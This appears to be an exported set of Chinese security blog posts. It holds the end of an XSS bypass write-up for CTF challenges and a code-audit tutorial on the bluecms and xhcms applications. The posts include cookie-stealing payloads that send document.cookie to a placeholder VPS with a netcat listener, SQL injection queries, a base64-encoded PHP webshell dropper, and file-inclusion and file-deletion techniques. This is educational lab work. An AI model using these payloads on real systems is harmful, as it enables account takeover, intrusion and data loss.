type=\"hidden\">\n&lt;/form>\nkeyword内容被转换为HTML实体，G，看下面，变成了四个隐藏参数，同上关，测试看哪个有回显\nkeyword=&lt;script>&amp;t_link=test&amp;t_history=test&amp;t_sort=test&amp;t_ref=test\n\nt_sort有回显，确定注入参数，尝试上关方法\nkeyword=1&amp;t_sort=\"type=\"checkbox\" onclick=alert(1)//\n没有出现框，查看源代码\n&lt;input name=\"t_link\"  value=\"\" type=\"hidden\">\n&lt;input name=\"t_history\"  value=\"\" type=\"hidden\">\n&lt;input name=\"t_sort\"  value=\"&amp;quot;type=&amp;quot;checkbox&amp;quot; onclick=alert(1)//\" type=\"hidden\">\n&lt;input name=\"t_ref\"  value=\"\" type=\"hidden\">\n发现双引号被转换为HTML实体，这个也没戏，这个也G，此时我查看过其他师傅的wp后，得知这里的t_ref参数是用Referer传值的，没有解释具体的原因，博主也只是小白,这个思路非要理的话也只能说是从ref这个想，或者抓包看有没有Referer头，Referer是告诉服务器你是从哪里来的，比如你在google中点击baidu.com这个链接，Referer头就是https://google.com，这里我们先进行测试一下，传个Referer值看源代码因此找到新的注入点，我们构造语句来闭合value，同之前相似，构造payload如下\n\" type=\"password\" onclick=alert(1)//\n\n空格绕过题目\n\n\n\n\n\n\n\n\n\n圣诞快乐，写下祝福语，生成链接，发送给朋友，可以领取十个鸡蛋！\n经过测试script被过滤此时我们用iframe标签来进行攻击\n&lt;iframe onload=alert(1);>&lt;/iframe>\n发现弹不出来，这里有空格，所以首先考虑一下是否空格被ban，我们这里用/**/来代替空格\n&lt;iframe/**/onload=alert(1);>&lt;/iframe>\n&lt;iframe/**/onload=alert(document.cookie);>&lt;/iframe>\n确实可以。flag藏于cookie中，我们需要想办法获取管理员的cookie，肯定不能&lt;iframe/**/onload=alert(document.cookie);&gt;&lt;/iframe&gt; ，因为这样的话得到的是自己的cookie，需要的是管理员的cookie，这时候有个方法就是我们利用我们的vps，用nc端口监听，然后直接我们在搜索框中添加一个js跳转链接加上获取cookie的代码，这时候管理员就会访问我们的ip地址，我们也就拿到了管理员cookie，也就得到了flag，思路有了，那payload构造也并非难事先在vps开启监听\nnc -lvnp 7777\n//虽然只能接收一次，但我们可以nc多次\npayload有以下几种\n&lt;body/**/onload=\"window.open('http://xxx:7777/'+document.cookie)\">&lt;/body>\n&lt;svg/**/onload=\"window.open('http://xxx:7777/'+document.cookie)\">&lt;/svg>\n&lt;input/**/onfocus=\"window.open('http://xxx:7777/'+document.cookie)\" autofocus>&lt;/input>\n&lt;iframe/**/onload=\"window.open('http://xxx:7777/'+document.cookie)\">&lt;/iframe>\n此时就得到了管理员cookie，解题完成\nDOM型实战0X01发现有注册的，先随便注册一下，然后登录只有管理员可以查看，这里的话我们的思路就是获取当前管理员的cookie，但是要从哪里着手呢，此时查看用户名和密码的源代码可以发现这两个都是不存在单引号或者双引号包裹的，因此我们可以直接插入一段js代码，借助vps调出管理员的cookie，而后修改我们的cookie为管理员的cookie，此时我们的身份就变成了管理员的，因此我们这里去再注册一个，账号注册如下\n&lt;iframe onload=\"window.open('http://xxx:7777/'+document.cookie)\">&lt;/iframe>\n&lt;script>window.location.href='http://xxx:7777/'+document.cookie;&lt;/script>\n密码随便写（当然，账号随便写，密码写成这个也可以）在你的vps开启监听端口\nnc -lvnp 7777\n登录后点击用户管理，此时再看vps得到管理员cookieruenb618p3e7tg5a6gtumcs89b 修改cookie值，刷新界面得到flagctfshow&#123;d5cdea15-ce33-4df2-b9f0-13aab7b94fa1&#125;\n0X02直接利用vps获取cookie，但是此时cookie一直是无效的，可能是管理员访问后立马登出，导致了cookie失效，我们这里获取的话可以去获取它的用户名和密码界面可以看见这个密码的话是在layui-table-cell laytable-cell-1-0-1类中的，因此我们需要用getElementsByClassName来获取，getElementsByClassName的作用是获取所有指定类名的元素在控制台中document.getElementsByClassName(&#39;layui-table-cell laytable-cell-1-0-1&#39;)可以发现密码在innerHTML中，此时再试着将这个输出这时候就得到了密码，那我们此时利用这个即可构造得到flag的语句，如下\n&lt;script>window.open('http://xxx:7777/'+document.getElementsByClassName('layui-table-cell laytable-cell-1-0-1')[1].innerHTML)&lt;/script>\n\n0X03发现此时多了一个修改密码的界面，我们在修改密码界面打开控制台在这里可以看见layui-container类包含了整个界面，因此类就确定为layui-container，此时我们用querySelector方法，querySelector() 方法返回文档中匹配指定 CSS 选择器的一个元素。，在这里的话我们就将这个界面的文本进行输出，因此构造payload如下即可\n&lt;script>window.open('http://xxx:7777/'+document.querySelector('#top > div.layui-container').textContent)&lt;/script>\n参考文献《从0到1:CTFer成长之路》https://www.cnblogs.com/hookjoy/p/3538487.htmlhttps://blog.csdn.net/LYJ20010728/article/details/116462782https://wizardforcel.gitbooks.io/xss-naxienian/content/2.htmlhttps://blog.csdn.net/qq_42383069/article/details/123419621https://www.cnblogs.com/csnd/p/11807592.htmlhttps://www.freebuf.com/articles/web/334662.htmlhttps://www.freebuf.com/articles/web/276998.htmlhttps://www.cnblogs.com/sfsec/p/15178028.html\n","slug":"XSS常见绕过姿势和绕某狗WAF所用标签小记","date":"2022-07-11T10:32:20.000Z","categories_index":"WEB知识","tags_index":"XSS","author_index":"quan9i"},{"id":"bf43e15989ef186ce3f8420a1b97dea6","title":"小白的代码审计初始之路","content":"声明文章首发于先知社区https://xz.aliyun.com/t/11553\n代码审计概念什么是代码审计？\n代码审计是在一个编程中对源代码旨在发现错误、安全漏洞或违反编程约定的项目。说人话就是找它这些代码中可能存在问题的地方，然后看它是否真的存在漏洞。(博主小白，可能存在问题，请见谅)\n分类代码审计的话大致分为三种，白盒、黑盒和灰盒\n白盒测试较为官方的定义\n已知产品的内部工作过程，可以进行测试证明每种内部操作是否符合设计规格要求，所有内部成分是否经过检查。\n其实这种测试的话就是你可以看到源代码，直接从代码中来看哪里可能出现问题，然后进行检测，此时你是知道内部结构的，测试相对黑盒测试会比较容易一点\n黑盒测试较为官方的定义\n已知产品的功能设计规格，可以进行测试证明每个实现了的功能是否符合要求。\n其实黑盒测试的话就是你只知道网页的大致结构，然后对各个功能开始检测，按自己的思路进行测试，比如看到留言界面，测试XSS，看到登录界面，测试SQL注入这种\n灰盒测试灰盒测试是介于白盒测试与黑盒测试之间，自己测试的同时结合代码来看。一般代码审计的话都是类似于这种灰盒测试的。\n如何代码审计了解CMS结构每个CMS都拥有数以百计的文件，这个时候我们该如何审，从哪里审呢，这个时候就要关注重要点，以这里的bluecms为例这里有多个文件及文件夹，该从何入手呢，首先就从文件夹的名字入手，因为程序员在开发时一般不会随意起名，对应的文件夹名一般都是有作用的，例如这里的install就是安装目录，具体分类大致如下\n\n\n\n\n\n\n\n\n\n├── admin     后台管理目录├── install   网站的安装目录├── api       接口文件目录├── data     系统处理数据相关目录├── include  用来包含的全局文件└── template  模板\n同时它还有(1)函数集文件，它的定义如下\n这类文件通常命名中包含functions或者common等关键字，这些文件里面是一些公共的函数，提供给其他文件统一调用，所以大多数文件都会在文件头部包含到它们，寻找这些文件一个非常好用的技巧就是去打开index.php或者一些功能性文件，在头部一般都能找到。\n(2)配置文件，它的定义如下\n这类文件通常命名里面包括config这个关键字，配置文件包括Web程序运行必须的功能性配置选项以及数据库等配置信息，从这个文件里面可以了解程序的小部分功能，另外看这个文件的时候注意观察配置文件中参数值是用单引号还是用的双引号包起来，如果是双引号，则很大可能会存在代码执行漏洞。\n寻找关键词大致的分类的话就如下所示\n命令执行  system、shell_exec、passthru、popen、proc_open\n文件包含  require、include、require_once、include_once\n变量覆盖  parse_str 、mb_parse_str\n代码执行  eval、assert、preg_replace\n文件操作  file_get_contents 、file_put_contents 、move_uploaded_file 、unlink &amp; delete\n这些是大致的关注点，但是如果自己去找的话一般这么多的文件，一个个ctrl+f寻找关键词也是比较慢的，因此一般的话是借用工具的，但工具不是百分百灵验的，我们需要结合自己的判断来看它是否真的存在漏洞，一会介绍一下工具，现在先具体的介绍一下这些关注点\nSQL注入关键词SQL注入，关注点就是SELECT xxx From xxx WHERE xxx以及UPDATE xxx SET xxx WHERE xxx这些字词，当出现这些的时候，才有可能出现SQL注入。同时还要关注character_set_connect=&#39;gbk&#39;这种语句，出现它时可能会出现宽字节注入。\n例如\n$ad = $db->getone(\"SELECT * FROM \".table('ad').\" WHERE ad_id =\".$ad_id);\n$db->query(\"UPDATE \".table('article').\" SET comment = comment+1 WHERE id = \".$id);\nXSS关键词XSS常见地是留言板，新闻编辑处这些可以写入内容的地方，同时我们可以结合之前存在的漏洞进行尝试XSS。\n任意文件删除关键词这类在修改头像、修改内容时可能比较常见，然后一般我们就可以去这类文件下看它是否有unlink函数，如果有的话就可能存在任意文件删除漏洞\n工具我们一般自己去找的话有点慢，效率不高，但代码审计有应用可以帮助我们进行代码审计，常见的是Seay源代码审计系统，seay工具链接如下https://github.com/f1tz/cnseay我们关注的SQL注入，我们就可以去搜索SELECT以及UPDATE对应的任意文件删除漏洞，我们就去搜索unlink函数这个时候就可以直接定位到利用函数的语句中，相比自己找要快捷很多，同时Seay代码审计具有自动代码审计的功能，用它也是蛮方便的。下面开始审计\nbluecms环境配置这个CMS是比较简单的一个，源码链接如下https://github.com/source-trace/bluecms我的环境配置是phpstudy 2018 5.5.38+mysql5.5.53，不要用7+这种高版本的php，因为这个cms是比较老的，它的部分函数与新版本php两者是不相匹配的，然后搭建好后访问bluecms-master/install/，这个时候可能界面是空白，我们需要开启一下允许目录列表然后去删除bluecms-master\\install\\compile下的php文件此时再去重新访问install按照步骤配置即可，但是到step=5时又变成空白了，不过这个时候已经搭建好了，访问bluecms-master/index.php就可以发现已经配置成功\n工具扫描使用seay工具进行扫描扫描这个cms后得到很多数据开始挨个进行分析\nSQL注入ad_js.php跟进第一条包含了common.inc.php文件，跟进查看这个文件if语句中有一个get_magic_quotes_gpc函数，查看这个get_magic_quotes_gpc函数这么看的话其实就是相当于if语句中始终为1，那也就是说它对GET POST COOKIES REQUEST这些请求的参数加上了deep_addslashes函数，此时跟进这个函数进行查看可以发现这里其实就是加上了addslashes函数，而这个函数呢是对单引号、双引号、反斜线加上\\进行转义的，因此这里其实就是限制了单引号、双引号、反斜线的使用，防止SQL注入\n再回到最开始，发现注入参数是ad_id，观察代码可以看出它对ad_id参数先进行了trim()过滤，也就是过滤了参数中的空白字符，例如空格 \\t \\r \\n这些，之后呢进行了SQL注入查询语句，参数两边是没有加单引号的，看起来是可以进行SQL注入的，此时发现getone函数，我们跟进这个函数进行查看从这里看出它这个函数是将结果取出的，因此这里的话我们总结一下，它就是一个SQL查询语句，我们可以控制where ad_id=xxx这一部分，同时它有这个单引号过滤函数，但是这里变量是没有被单引号包裹的，所以这里这个函数其实是无效的，而且这个结果有回显，会返回结果，我们此时就可以尝试在此界面进行SQL注入访问bluecms-master/ad_js.php,先看一下字段数\nad_id=-1 order by 7\nad_id=-1 order by 8\n当是7的时候无回显，为8的时候报错，说明字段数为7，接下来尝试联合查询\n-1 union select 1,2,3,4,5,6,7\n看起来是无回显的，但当我们去查看源代码时就会发现是有回显的，不过加了注释因此这里的这个7就是回显位，接下来开始注入即可\n//查库\n-1 union select 1,2,3,4,5,6,database()\n//查表\n-1 union select 1,2,3,4,5,6,(select group_concat(table_name)  from infromation_schema.tables where table_schema=database()\n当然这里这个查表也可以用十六进制来进行绕过我这里的数据库名是root，对其进行十六进制加密后为726f6f74，加上0x使得能够被识别为十六进制数，构造payload如下\n//查表\nad_id=-1 union select 1,2,3,4,5,6,(select group_concat(table_name)  from information_schema.tables where table_schema=0x726f6f74)\n//查列(以blue_user为例)\nad_id=-1 union select 1,2,3,4,5,6,(select group_concat(column_name)  from information_schema.columns where table_name=0x626c75655f75736572)\n//查字段\nad_id=-1 union select 1,2,3,4,5,6,(select group_concat(user_id,0x7e,user_name,0x7e,pwd)  from blue_user)\n\nann.php（失败）只看这个SELECT语句的话，确实是没有什么过滤的，看起来可以进行SQL注入但是看最上面的传值处就会发现这两个在有值时，结果是intval函数包含后的，我们测试一下这个函数\n&lt;?php\n$a=$_REQUEST['a'];\necho intval($a);\n?>\n可以发现字母都被pass了，因此这里的话，就没办法进行SQL注入了G，下一个。\ncomment.php（失败）打开发现这个SELECT语句中id变量是无单引号包裹的id如果没有被过滤的话，就存在可注入点，看id传值处id添加了intval函数，因此这个参数是无法进行注入了，此时这个type也同理，限制了值只能是0或1，这个act的话限制了只能为list或者send，而且它不在查询语句这种里面，在这个文件里没有用到，因此也是可以判定为没戏的，所以这个文件也G\nuser.php(失败)按照seay审计系统的来，发现这个有select语句，但是它的变量都是有单引号包裹的在最上方看看包含的文件发现包含有这个common.inc.php文件，而这个文件中有过滤单引号的函数，因此这里不存在SQL注入。\n下一处这里的id变量未被单引号包裹，但它在传值时添加了intval函数，这意味着字符串无法上传，因此这个也是无法成功注入的。PASS\nXSSad_js.php这个ad_id变量可控，而且它没有单引号包裹，那不就意味着我们可以随意构造后面的语句，不仅仅是SQL注入，XSS应该也是可以的，我们构造payload如下\n1 &lt;script>alert(/quan9i/)&lt;/script>\n\nuser.php\nelseif ($act == 'do_add_news') &#123;\n include_once 'include/upload.class.php';\n $image = new upload();\n $title = !empty($_POST['title']) ? htmlspecialchars(trim($_POST['title'])) : '';\n $color = !empty($_POST['color']) ? htmlspecialchars(trim($_POST['color'])) : '';\n $cid = !empty($_POST['cid']) ? intval($_POST['cid']) : '';\n if(empty($cid))&#123;\n   showmsg('���ŷ��಻��Ϊ��');\n &#125;\n $author = !empty($_POST['author']) ? htmlspecialchars(trim($_POST['author'])) : $_SESSION['admin_name'];\n $source = !empty($_POST['source']) ? htmlspecialchars(trim($_POST['source'])) : '';\n $content = !empty($_POST['content']) ? filter_data($_POST['content']) : '';\n $descript = !empty($_POST['descript']) ? mb_substr($_POST['descript'], 0, 90) : mb_substr(html2text($_POST['content']),0, 90);\n if(isset($_FILES['lit_pic']['error']) &amp;&amp; $_FILES['lit_pic']['error'] == 0)&#123;\n   $lit_pic = $image->img_upload($_FILES['lit_pic'],'lit_pic');\n这里发现title和color添加了转换HTML实体函数，因此是可以确定是不存在XSS的，下面亦是如此，但我们发现包含content的函数是不同的，它是filter_data函数包裹的，跟进这个函数看看\n函数如下\nfunction filter_data($str)\n&#123;\n  $str = preg_replace(\"/&lt;(\\/?)(script|i?frame|meta|link)(\\s*)[^&lt;]*>/\", \"\", $str);\n  return $str;\n&#125;\n发现过滤了常用的xss标签，但仍存在其他的xss标签，如\n&lt;img src=1 onerror=alert(1)>\n&lt;a href=javascript:alert(1)>&lt;/a>\n&lt;svg onload=alert(1)>\n&lt;button onclick=alert(1)>\n\n此时这个应该是有可能的，我们看后面他还有没有过滤可以发现这个SQL语句直接将这个content给写进去了，那这里就应该是存在XSS的，我们尝试构造一下这里加*的应该是必选项，那我们就只写这几个即可，构造payload如下点击编辑成功触发XSS\nguest_book.php在看前台的时候发现有一个留言的界面，点击访问，url跳转到了guest_book.php下，查看源码可以发现这个里面的内容加上了HTML实体标签，因此内容实现XSS是没戏，而且在开头可以发现包含了一个文件这个文件里面对单引号进行了转义，这里的话还剩一个变量是page_id，可以发现这个参数是没有被单引号或者双引号包裹的，然后我们看一下包含它的showmsg函数也并未对这个id进行过滤，说明这里可能有戏，我们先正常上传一个123试试上传后没有异常，查看界面源代码找到我们的page_id变量，这里就可以发现是被input标签中value属性包含的，如果我们可以摆脱这个，那么就可以实现xss，那这个时候我们闭合双引号，先写一个&quot;，再闭合标签，用&gt;，而后加上我们的xss语句&lt;scipt&gt;alert(1)&lt;/script&gt;即可，此时我们想到开头不是有一个转义双引号的吗，但是我们看一下这里此时的语句\nvalue=\"\\\">&lt;script>alert(1)&lt;/script>\"\n这个\\正好被当做了value的值，双引号还是起到作用了，此时我们来传值进行尝试成功XSS\n文件包含user.phpseay审计代码系统扫描中发现一个文件包含漏洞\n跟进进行查看发现这里在上过pay之后直接进行了包含，如果版本号低的话，应该是可以利用%00截断\n\n\n\n\n\n\n\n\n\n%00截断magic_quotes_gpc=off，PHP小于5.3.4\n还有路径长度截断\n\n\n\n\n\n\n\n\n\n路径长度截断Linux 需要文件名长于 4096，Windows 需要长于 256\n但在这里测试%00截断行不通，尝试路径长度截断可行这里的php文件是本地的，那我们该如何去上传一个文件来getshell呢发现user下有一个上传头像的，如果这个文件名可控的话，那么就可以getshell了发现此时给出了文件名包含一下同时传值进行尝试成功，还有一种方式，因为这里的话是include一个文件，我们知道include文件的话，就会执行这个文件里的语句，那我们就可以让他包含一个文件，然后这个文件里写入我们的小木马即可，示例如下这个是1.php\n&lt;?php\ninclude(\"qq.php\");\n?>\n然后这个是qq.php\n&lt;?php @fputs(fopen('shell.php','w'),base64_decode('PD9waHAgQGV2YWwoJF9QT1NUWzFdKT8+'));?>\n//PD9waHAgQGV2YWwoJF9QT1NUWzFdKT8+为&lt;?php @eval($_POST[1])?>\n然后我们去访问1.php此时再看这个文件夹下成功写入，原理就是这样。此时我们再来看这里，我们传入的方式的话就是上传头像，我们将我们php文件改为jpg而后上传，内容依旧是写入shell.php，其内容为一句话木马\n&lt;?php @fputs(fopen('shell.php','w'),base64_decode('PD9waHAgQGV2YWwoJF9QT1NUWzFdKT8+'));?>\n\n此时还需要进行一下文件包含，我们去查看一下当前的头像路径此时去包含它，用刚刚路径长度截断的姿势即可此时去查看shell.php，如果界面空白则应该是上传成功蚁剑连接\n任意文件删除这种的话一般是找unlink函数，这个函数是删除文件的，可能存在任意文件删除漏洞，这里的话我门用seay代码审计工具来进行查看跟进user.php查看\nuser.phpid参数(失败)看起来的话是没有什么过滤的，不过前面有个query函数，跟进查看一下\n可以发现当它查询这个id在结果中没有的时候，它就会把错误返回，那这个时候就无法继续运行了，而我们如果想实现任意文件删除的话，变量id肯定是要写成文件名的，那这个时候无法往下运行，这个也就无法实现任意文件删除，因此这个实现不了任意文件删除\nface_pic3参数这个有多个参数中涉及了unlink函数，我们挨个进行查看这里的话可以发现这个face_pic3是在unlink函数下的，跟进这个变量会发现也只在这里提及，因此这里的话不存在过滤，此时如果这个else语句能执行，我们就可以通过控制这个变量来实现任意文件删除，此时看看上面语句它是在act变量为edit_user_info下的，因此我们令act为edit_user_info即可，而后发现这些变量不传不会跳出，我们就不填这些变量即可，然后来到这个if-else语句，为了让else语句执行，所以if的条件是不能满足的，if里的条件是face_pic1不为空，我们这里让它为空就可以执行else语句，因此按理说直接post传face_pic3就可以实现任意文件删除，尝试我们这里本地是有shell.jpg的，我们删除它来试试发包成功实现。\nlit_pic参数发现这个lit_pic变量然后跟进变量的话发现它是只出现在这里的，这意味着它这个变量是没有其他过滤的，这里我们也不需要输入单引号或者双引号，直接让lit_pic等于我们想删除的文件夹名即可实现任意文件删除，但是要实现这个，肯定需要满足上面的条件，这样才能往下进行，因此我们从上面的语句开始看只有这个首先满足这个，所以我们就需要写title变量姓名和电话，这意味着link_man和link_phone也是需要填写的，还有开始的变量lit_pic,这里post传入的也就是四个变量，这个时候先看看我们本地的文件可以发现是有shell.php的，我们尝试删除它，即让lit_pic的值为它此时查看本地成功实现了任意文件删除\n熊海cms环境搭建下载地址https://down.chinaz.com/soft/36930.htm安装后访问install界面填写完成过后点确定即可此时再访问index.php配置完成\n了解CMS结构结构如下对应功能如下\n\n\n\n\n\n\n\n\n\nadmin         –管理后台文件夹css           –存放css的文件夹files         –存放页面的文件夹images        –存放图片的文件夹inc           –存放网站配置文件的文件夹install       –网站进行安装的文件夹seacmseditor  –编辑器文件夹template      –模板文件夹upload        –上传功能文件夹index.php     –网站首页\n工具扫描发现存多个漏洞，包括SQL注入和任意文件包含等，下面开始进行分析\n文件包含index.php源码如下\n&lt;?php\n//单一入口模式\nerror_reporting(0); //关闭错误显示\n$file=addslashes($_GET['r']); //接收文件名\n$action=$file==''?'index':$file; //判断为空或者等于index\ninclude('files/'.$action.'.php'); //载入相应文件\n可以发现这里没有包含什么文件，开始看代码。这个的话是get传参了一个变量r，这个r被addslashes函数包裹然后把这个值赋给了file变量，此时有个三元运算符，如果变量file为空就令file等于index同时赋值给action变量，否则就令变量file为变量r的值，然后赋值给action变量此时包含了这个action变量，在action前后进行了拼接。\n这里的代码就读到这就结束了，然后我们需要了解一下这个addslashes函数\naddslashes — 使用反斜线引用字符串\n该字符串为了数据库查询语句等的需要在某些字符前加上了反斜线。这些字符是单引号（'）、双引号（\"）、反斜线（\\）与 NUL（NULL 字符）。 \n也就是说对单引号、双引号、反斜线和NUL进行了转义，这里的话我们的路径一般用的是./这些，不受影响，因此这里的话我们先在本地放一个1.php文件，写入phpinfo()传一下看看是否能成功上传成功\n那如果不是php文件的话，这里该怎么进行利用呢，这个时候就用到了路径长度截断，在bluecms中也曾利用过，这里我们再次尝试先在本地放一个txt文件内容为phpinfo即可，具体如下采用路径长度截断(.号长度大于256即可)注\n但这个经过测试，只有在php版本为5.2.17时可以成功，其他情况都不行\n这个的话是可以成功进行文件包含的，看下一处\nadmin/index.php&lt;?php\n//单一入口模式\nerror_reporting(0); //关闭错误显示\n$file=addslashes($_GET['r']); //接收文件名\n$action=$file==''?'index':$file; //判断为空或者等于index\ninclude('files/'.$action.'.php'); //载入相应文件\n?>\n代码同上，这里肯定也可以进行文件包含，思路同上即可，不再演示\nSQL注入这种的话可以先测测登录点，一般都是admin，这种登录框的可能会出现SQL注入，先测试一下是否是单引号闭合的\n报错，有戏既然报了个错，那就用个报错注入好了爆库\n1' and (extractvalue(1,concat(0x7e,(select database()  limit 1,1),0x7e)))#\n爆表\n1' and (extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database()  limit 1,1),0x7e)))#\n\n后面按照常规注入即可，此时看看后端代码\n&lt;?php \nob_start();\nrequire '../inc/conn.php';\n$login=$_POST['login'];\n$user=$_POST['user'];\n$password=$_POST['password'];\n$checkbox=$_POST['checkbox'];\n\nif ($login&lt;>\"\")&#123;\n$query = \"SELECT * FROM manage WHERE user='$user'\";\n$result = mysql_query($query) or die('SQL语句有误：'.mysql_error());\n$users = mysql_fetch_array($result);\n\nif (!mysql_num_rows($result)) &#123;  \necho \"&lt;Script language=JavaScript>alert('抱歉，用户名或者密码错误。');history.back();&lt;/Script>\";\nexit;\n&#125;else&#123;\n$passwords=$users['password'];\nif(md5($password)&lt;>$passwords)&#123;\necho \"&lt;Script language=JavaScript>alert('抱歉，用户名或者密码错误。');history.back();&lt;/Script>\";\nexit; \n发现user是没有进行过滤的，直接放入了select语句中，造成了SQL注入\nadmin/files/adset.php(失败)&lt;?php\nrequire '../inc/checklogin.php';\nrequire '../inc/conn.php';\n$setopen='class=\"open\"';\n$query = \"SELECT * FROM adword\";\n$resul = mysql_query($query) or die('SQL语句有误：'.mysql_error());\n$ad = mysql_fetch_array($resul);\n\n$save=$_POST['save'];\n$ad1=addslashes($_POST['ad1']);\n$ad2=addslashes($_POST['ad2']);\n$ad3=addslashes($_POST['ad3']);\nif ($save==1)&#123;\n$query = \"UPDATE adword SET \nad1='$ad1',\nad2='$ad2',\nad3='$ad3',\ndate=now()\"；\n可以看到这里的话有这个 &quot;UPDATE adword SET  ad1=&#39;$ad1&#39;语句，我们这里可控的变量是ad1，但ad1被单引号包裹了，我们如果想要进行SQL注入的话肯定需要闭合单引号，此时我们看ad1的传入方式，发现$ad1=addslashes($_POST[&#39;ad1&#39;]);，它被这个addslashes函数包裹了，这就意味着我们的单引号输入后会被转义，那也就无法闭合之前的语句，因此无法实现SQL注入，这里是误报了属于是\nadmin/files/editcolumn.php部分代码如下\n&lt;?php\nrequire '../inc/checklogin.php';\nrequire '../inc/conn.php';\n$columnopen='class=\"open\"';\n$id=$_GET['id'];\n$type=$_GET['type'];\n\nif ($type==1)&#123;\n$query = \"SELECT * FROM nav WHERE id='$id'\";\n$resul = mysql_query($query) or die('SQL语句有误：'.mysql_error());\n$nav = mysql_fetch_array($resul);\n&#125;\nif ($type==2)&#123;\n$query = \"SELECT * FROM navclass WHERE id='$id'\";\n$resul = mysql_query($query) or die('SQL语句有误：'.mysql_error());\n$nav = mysql_fetch_array($resul);\n&#125;\n这里我们可以看见到这个id参数是可控的，虽然它被包裹在单引号中，但id的传参是直接get传参的，此时就剩下两个开头的包含文件了，如果包含的文件是没有过滤的话，那这里应该就是可以进行SQL注入的，查看这两个文件conn.php内容如下\n&lt;?php\n  error_reporting(0);\n  header('Content-Type:text/html;charset=utf-8');\n  require 'conn.info.php';\n  //常量参数\n  define('DB_HOST',$DB_HOST);\n  define('DB_USER',$DB_USER);\n  define('DB_PWD',$DB_PWD);\n  define('DB_NAME',$DB_NAME);\n  \n  //第一步，连接MYSQL服务器\n  $conn = @mysql_connect(DB_HOST,DB_USER,DB_PWD) or die(header('Location: /install'));\n  \n  //第二步，选择指定的数据库，设置字符集\n  mysql_select_db(DB_NAME) or die('数据库错误，错误信息：'.mysql_error());\n  mysql_query('SET NAMES UTF8') or die('字符集设置错误'.mysql_error());\n  date_default_timezone_set('PRC'); //设置中国时区\n?>\n连接数据库的文件，再查看另一个checklogin.php内容如下\n&lt;?php\n$user=$_COOKIE['user'];\nif ($user==\"\")&#123;\nheader(\"Location: ?r=login\");\nexit; \n&#125;\n?>\n这个是检验是否登录的因此这里不存在过滤，接下来去尝试一下SQL注入尝试闭合\nr=editcolumn&amp;type=2&amp;id=1'  --+ \n成功，接下来查看字段数字段数为9，接下来查看回显位3、4、5、8都可以，随便整一个开始注入\nr=editcolumn&amp;type=2&amp;id=-1' union select 1,2,database(),4,user(),6,7,@@version,9 --+ \n\n成功注入\nadmin/files/editsoft.php部分源码如下\n&lt;?php\nrequire '../inc/checklogin.php';\nrequire '../inc/conn.php';\n$wzlistopen='class=\"open\"';\n$id=$_GET['id'];\n$query = \"SELECT * FROM download WHERE id='$id'\";\n$resul = mysql_query($query) or die('SQL语句有误：'.mysql_Aerror());\n$download = mysql_fetch_array($resul);\n可以看出是类似于上面那个文件的，尝试用上关方法去进行SQL注入查询字段数\n字段数为18，查看回显位开始联合查询\nr=editsoft&amp;type=2&amp;id=-1'union select 1,database(),3,4,5,6,7,8,9,user(),@@version,12,13,14,15,16,17,18--+\n\n成功注入\ndownloads. php这里的话可以发现是id参数是被&#39;)包裹的，且来自于变量fileid，fileid变量是由cid参数经过addlashes函数后得到的，那这里的话单引号肯定就会被转义了，想闭合语句的话不太可能，所以这里的话SQL注入是没戏，这里算是G了。\ninstall/index.php在此处发现有update语句和可控的变量password和username，查看这两个变量的传入方式可以发现是直接传入的，没有什么过滤，那么这里就可以在user变量处尝试SQL注入了单引号测试结果如下尝试报错注入\n1' and (extractvalue(1,concat(0x7e,(select database()),0x7e)))#\n\n\n爆表\n1' and (extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database()  limit 1,1),0x7e)))#\n\n\nXSSadmin/files/adset.php关键代码如下\n&lt;div class=\"form-group\">\n&lt;label class=\"col-lg-4 control-label\">广告一&lt;/label>\n&lt;div class=\"col-lg-8\">\n&lt;textarea name=\"ad1\" class=\"form-control col-lg-12\" placeholder=\"ad-1\">&lt;?php echo $ad['ad1']?>&lt;/textarea>                                  \n&lt;/div>\n&lt;/div>\n可以发现这里的变量ad1是可控的，然后他是在&lt;/textarea&gt; 标签中，如果闭合了这个标签，是不是就意味着我们可以构造自己的语句，也就可以写xss了，此时看一下传变量的方式\n&lt;?php\nrequire '../inc/checklogin.php';\nrequire '../inc/conn.php';\n$setopen='class=\"open\"';\n$query = \"SELECT * FROM adword\";\n$resul = mysql_query($query) or die('SQL语句有误：'.mysql_error());\n$ad = mysql_fetch_array($resul);\n\n$save=$_POST['save'];\n$ad1=addslashes($_POST['ad1']);\n$ad2=addslashes($_POST['ad2']);\n$ad3=addslashes($_POST['ad3']);\nif ($save==1)&#123;\n$query = \"UPDATE adword SET \nad1='$ad1',\nad2='$ad2',\nad3='$ad3',\ndate=now()\";\n@mysql_query($query) or die('修改错误：'.mysql_error());\necho \"&lt;script>alert('亲爱的，广告设置成功更新。');location.href='?r=adset'&lt;/script>\"; \nexit;\n&#125;\n?>\n发现是POST传值，这里还有addslashes函数，但变量未被单引号包裹，我们不需要单引号，这就意味着这个是没有什么作用的，尝试xss\nad1=&lt;/textarea>&lt;script>alert(1)&lt;/script>&amp;save=1\n\n\nadmin/login刚刚我们测试过它存在SQL注入漏洞，并且知道它是单引号闭合，既然我们可以后面写入报错语句，那岂不是也可以写入我们的xss语句，尝试一下\n1'adn&lt;script>alert(1)&lt;/script>#\n\n\n调用一下cookie\ninstall/index.php\n总结从这两个简单的CMS代码审计中学到了一点知识，简单的总结一下\n不同CMS异同大部分没MVC框架的CMS，他们的结构是比较相似的，我们可以看一下这两个CMS的结构可以发现两者的结构是比较相像的，当我们掌握文件夹的功能时，就能够使得我们的代码审计轻松许多，因此通过文件夹掌握其功能含义是我们首先需要做到的\n区别的话就是有的程序员会把css单独作为文件夹(例如这里的xhcms)，有的会把js文件单独作为文件夹(这里的bluecms)，不过这些都是无关紧要的，大致知道文件夹是什么含义，存放的文件是什么就可以\n常见关注点SQL注入：\nselect insert update mysql_query mysqli等\n文件上传：\n$FILES，type=\"file\"，上传，move_upload_file( )等\nXSS跨站：\nprint，print_r，echo，sprintf，die，var_dump，var_export等\n文件包含：\ninclude，include_once，require，require_once等\n代码执行：\neval，assert，preg，replace，call，user，func，call_user_func，array等\n命令执行：\nsystem，exec，shell_exec，``，passthru，pcntl_exec，popen，proc_open等\n变量覆盖：\nextract() parse_str() importrequestvariables() $$\n反序列化：\nserialize() unserialize() _construct _destruct等\n个人感想我们挖掘出一个漏洞的时候，它可能不仅仅只是这一个漏洞，举个例子。当我们关注一个地方的SQL注入的话，就是找SELECT * 